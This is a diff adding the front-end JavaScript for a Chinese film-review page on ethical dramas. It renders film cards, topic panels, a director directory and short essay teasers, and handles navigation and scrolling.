+var NEWS=[
+  {cat:"读片笔记",t:"《一次别离》为什么不敢二刷",p:"它太真实了。真实到你在银幕上看见的，不是别人的两难，而是自己曾经说过的那句谎话。这篇笔记写给每一个在关系里撒过谎的人。",rd:3120},
+  {cat:"导演谱系",t:"李沧东：用镜头追问“人为什么作恶”",p:"从《绿鱼》到《燃烧》，李沧东始终是韩国电影里最不肯妥协的那一个。他不要答案，只要你把问题带回家。",rd:2480},
+  {cat:"议题解读",t:"伦理片的三种“两难”结构",p:"电车难题、忠诚冲突、信息不对称——大多数伦理片，其实都在反复讲这三种结构。看懂了，你就看懂了人心。",rd:1960},
+  {cat:"片单推荐",t:"周末片单：5 部让人安静下来的伦理片",p:"不喧嚣、不煽情、不催泪。这 5 部影片适合一个人、一杯茶、一个没有安排的下午，慢慢看完。",rd:1540},
+  {cat:"观影方法",t:"看伦理片，别急着站队",p:"伦理片的乐趣不在“谁对谁错”，而在“为什么他会这样选”。放慢一点，把判断先放下，电影才会把真相交给你。",rd:1180},
+  {cat:"经典回顾",t:"那些年被低估的伦理佳作",p:"票房不高的好电影有很多，其中被低估最严重的，往往是伦理片。它们不刺激，但后劲最大。",rd:930}
+];
+
+function esc(s){return String(s).replace(/&/g,"&amp;").replace(/"/g,"&quot;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
+
+function renderGrid(){
+  var h="",i,f;
+  for(i=0;i<FILMS.length;i++){
+    f=FILMS[i];
+    h+='<article class="mv" style="--bg:'+f.bg+'"><div class="cvr"><span class="tg">'+esc(f.tg)+'</span><span class="sc">评分 '+f.s+'</span><b>'+esc(f.t)+'</b><small>'+esc(f.y)+'</small></div><div class="bd"><div>'+esc(f.g)+'</div><div class="row"><i><em data-w="'+(f.s*10)+'"></em></i> '+f.s+'</div></div></article>';
+  }
+  document.getElementById("grid").innerHTML=h;
+  var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){e.target.style.width=e.target.dataset.w+"%";io.unobserve(e.target);}});},{threshold:.2});
+  document.querySelectorAll(".mv .row i em").forEach(function(el){io.observe(el);});
+}
+function renderAcc(){
+  var h="",i,t;
+  for(i=0;i<TOPICS.length;i++){
+    t=TOPICS[i];
+    var cs="",j;
+    for(j=0;j<t.chips.length;j++) cs+='<a href="#">'+esc(t.chips[j])+'</a>';
+    h+='<details class="d"'+(i===0?" open":"")+'><summary><span class="no">0'+t.n+'</span><span>'+esc(t.t)+'<br><small style="font-family:inherit;font-size:10.5px;color:#8a8178;font-weight:600;letter-spacing:.5px">'+esc(t.sum)+'</small></span><span class="ar">▼</span></summary><div class="cx"><p>'+esc(t.p)+'</p><div class="chips">'+cs+'</div></div></details>';
+  }
+  document.getElementById("acc").innerHTML=h;
+}
+function renderDir(){
+  var az="ABCDEFGHIJKLMNOPQRSTUVWXYZ".split(""),h="",i;
+  for(i=0;i<az.length;i++) h+='<a href="#" class="'+(i===0?"on":"")+'">'+az[i]+'</a>';
+  document.getElementById("az").innerHTML=h;
+  var d="",a;
+  for(i=0;i<AUTEURS.length;i++){
+    a=AUTEURS[i];
+    d+='<div class="au" style="--bg:'+a.bg+'"><div class="av">'+esc(a.n[0])+'</div><b>'+esc(a.n)+'</b><small>'+esc(a.c)+' · 伦理叙事</small></div>';
+  }
+  document.getElementById("dir").innerHTML=d;
+}
+function renderList(){
+  var h="",i,l,box=document.getElementById("list2");
+  box.style.counterReset="ln";
+  for(i=0;i<LIST.length;i++){
+    l=LIST[i];
+    h+='<article class="ln"><h4>'+esc(l.t)+'</h4><p>'+esc(l.d)+'</p></article>';
+  }
+  box.innerHTML=h;
+}
+function renderNews(){
+  var h="",i,n;
+  for(i=0;i<NEWS.length;i++){
+    n=NEWS[i];
+    h+='<article class="nt"><span class="cat2">'+n.cat+'</span><h4>'+esc(n.t)+'</h4><p>'+esc(n.p)+'</p><div class="ft"><span>神马电影网伦理片 · 原创</span><b>'+n.rd+' 阅读</b></div></article>';
+  }
+  document.getElementById("paper").innerHTML=h;
+}
+
+document.addEventListener("DOMContentLoaded",function(){
+  renderGrid();renderAcc();renderDir();renderList();renderNews();
+  document.getElementById("yr").textContent=new Date().getFullYear();
+
+  var mb=document.getElementById("mb"), nav=document.getElementById("nav");
+  mb.addEventListener("click",function(){
+    nav.classList.toggle("open");
+    var o=nav.classList.contains("open");
+    mb.textContent=o?"✕":"☰";
+    mb.setAttribute("aria-expanded",o?"true":"false");
+  });
+  var as=nav.querySelectorAll("a");
+  for(var a=0;a<as.length;a++){
+    as[a].addEventListener("click",function(){nav.classList.remove("open");mb.textContent="☰";mb.setAttribute("aria-expanded","false");});
+  }
+
+  var secs=document.querySelectorAll("section[id]"), items=document.querySelectorAll(".nav a"), tt=document.getElementById("top");
+  function onScroll(){
+    var pos=window.scrollY+172, cur="";
+    for(var s=0;s<secs.length;s++){ if(secs[s].offsetTop<=pos) cur=secs[s].id; }
+    for(var n=0;n<items.length;n++){ items[n].classList.toggle("on", items[n].getAttribute("href")==="#"+cur); }
+    tt.classList.toggle("show", window.scrollY>700);
+  }
+  window.addEventListener("scroll",onScroll,{passive:true});
+  onScroll();
+  tt.addEventListener("click",function(){window.scrollTo({top:0,behavior:"smooth"});});
+});
+</script>
+</body>
+</html>
